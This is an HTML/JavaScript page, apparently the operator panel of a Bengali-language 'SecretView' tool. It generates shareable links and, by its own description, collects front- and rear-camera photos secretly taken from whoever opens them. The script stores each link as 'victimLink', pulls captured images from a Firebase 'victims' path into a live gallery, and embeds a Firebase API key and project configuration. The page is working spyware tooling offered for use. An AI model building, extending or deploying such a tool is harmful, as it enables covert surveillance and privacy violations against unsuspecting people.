<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SecretView • গোপন ছবি লাইভ</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#f5f7fa,#c3cfe2);color:#222;min-height:100vh}
header{background:#000;padding:25px 0;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,0.2)}
.logo{height:90px;border-radius:50%;border:4px solid #ff0050;animation:pulse 3s infinite}
@keyframes pulse{0%,100%{box-shadow:0 0 20px #ff0050}50%{box-shadow:0 0 40px #ff0050}}
.container{max-width:950px;margin:30px auto;padding:20px;text-align:center}
.thumb{max-width:700px;width:100%;border-radius:20px;margin:30px auto;box-shadow:0 15px 40px rgba(0,0,0,0.2);border:3px solid #fff}
h1{font-size:3.2em;margin:20px 0;background:linear-gradient(45deg,#ff0050,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:800}
p{font-size:1.3em;color:#444;margin:15px auto;max-width:700px}
.btn{background:#ff0050;color:#fff;padding:18px 60px;font-size:1.5em;border:none;border-radius:50px;cursor:pointer;margin:15px;font-weight:bold;box-shadow:0 10px 30px rgba(255,0,80,0.4);transition:.3s}
.btn:hover{transform:translateY(-8px);box-shadow:0 20px 40px rgba(255,0,80,0.6)}
#linkBox{display:none;margin:50px auto;padding:35px;background:#fff;border-radius:20px;max-width:750px;box-shadow:0 15px 40px rgba(0,0,0,0.15);border:3px dashed #ff0050}
#victimLink{width:100%;padding:18px;font-size:1.3em;border:2px solid #ff0050;border-radius:15px;background:#fff;color:#d00040;font-weight:bold;text-align:center;margin:20px 0;word-break:break-all}
.gallery{margin-top:80px;background:#fff;padding:40px 20px;border-radius:25px;box-shadow:0 10px 30px rgba(0,0,0,0.1)}
.gallery h2{font-size:2.3em;color:#ff0050;margin-bottom:30px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:25px}
.grid img{width:100%;height:220px;object-fit:cover;border-radius:18px;border:5px solid #ff0050;box-shadow:0 10px 25px rgba(0,0,0,0.3);transition:.4s;cursor:pointer}
.grid img:hover{transform:scale(1.08);box-shadow:0 20px 40px rgba(255,0,80,0.5)}
.noimg{color:#888;font-size:1.7em;padding:60px;background:#f9f9f9;border-radius:20px}
footer{text-align:center;padding:40px;background:#000;color:#fff;margin-top:100px;font-size:1.1em}
footer a{color:#ff0050;text-decoration:none;font-weight:bold}
</style>
</head>
<body>

<header>
  <img src="https://i.ibb.co.com/5YZpX7K/logo.png" alt="Logo" class="logo">
</header>

<div class="container">
  <!-- ইউটিউব থাম্বনেইল -->
  <img src="https://i.ibb.co.com/4pJ3T1F/thumb.jpg" alt="Demo Video" class="thumb">

  <h1>গোপনে লাইভ ছবি দেখুন</h1>
  <p>লিংক শেয়ার করুন → কেউ খুললেই তার ফোনের সামনে + পিছনে ক্যামেরা থেকে ছবি এখানে চলে আসবে!</p>

  <button class="btn" onclick="generateLink()">নতুন গোপন লিংক তৈরি করুন</button>

  <div id="linkBox">
    <h2 style="color:#ff0050;margin-bottom:20px">তোমার লিংক রেডি!</h2>
    <input type="text" id="victimLink" readonly>
    <br><br>
    <button class="btn" onclick="copyLink()">কপি করুন</button>
  </div>

  <div class="gallery">
    <h2>লাইভ ছবি গ্যালারি</h2>
    <div class="noimg" id="noimg">এখনো কোনো ছবি আসেনি। লিংক শেয়ার করুন!</div>
    <div class="grid" id="grid"></div>
  </div>
</div>

<footer>
  © 2025 COPYRIGHT BY <a href="#">X4XOR</a> · ATI LINKABLE THAKBE
</footer>

<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<script>
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let currentId = null;

function generateLink(){
  currentId = Date.now().toString(36);
  const base = location.origin + location.pathname.replace('index.html','');
  const link = base + "view.html?id=" + currentId;
  document.getElementById("linkBox").style.display = "block";
  document.getElementById("victimLink").value = link;
  document.getElementById("grid").innerHTML = "";
  document.getElementById("noimg").style.display = "block";
  loadPhotos();
}
function copyLink(){
  const inp = document.getElementById("victimLink");
  inp.select(); document.execCommand("copy");
  alert("লিংক কপি হয়ে গেছে!");
}
function loadPhotos(){
  if(!currentId) return;
  db.ref("victims/"+currentId).on("value", s=>{
    const grid = document.getElementById("grid");
    const noimg = document.getElementById("noimg");
    grid.innerHTML = "";
    if(s.val()){
      noimg.style.display = "none";
      Object.values(s.val()).reverse().forEach(p=>{
        const img = document.createElement("img");
        img.src = p.data;
        img.onclick = () => window.open(p.data, "_blank");
        grid.appendChild(img);
      });
    }
  });
}
</script>
</body>
</html>
